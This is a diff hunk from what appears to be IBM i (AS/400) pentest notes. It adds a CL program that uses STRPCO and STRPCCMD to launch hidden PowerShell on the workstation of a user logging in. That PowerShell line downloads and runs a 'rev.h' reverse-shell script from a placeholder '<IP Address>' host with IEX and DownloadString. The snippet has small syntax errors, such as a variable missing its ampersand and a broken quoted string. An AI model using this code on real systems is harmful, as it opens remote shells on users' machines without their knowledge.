@@ -13,7 +13,22 @@
 # CL program will execute notepad on the workstation the user is logging in from:
   STRPCO
   STRPCCMD PCCMD(CALC) PAUSE(*NO)
- 
+
+# Or this CL program will execute powershell on remote workstation to download exploit/shell
+PGM
+  DCL                        VAR(&URL) TYPE(*CHAR) LEN(200)
+  DCL                        VAR(PSH) TYPE(*CHAR) LEN(200)
+  CHGVAR              VAR(&URL) +
+                      VALUE('HTTP://<IP Address/rev.h)
+  CHGVAR              VAR(PSH) +
+                      VALUE('powershell -w hidden -c "IEX ((new-object +
+                      net.webclient).downloadstring(''http://<IP Address>/+
+                      rev.h''))"')
+STRPCO
+STRPCCMD PCCMD(&PSH) PAUSE(*NO)
+ENDPGM
+
+
 
 How to write CL code:
                 1. Create a physical file
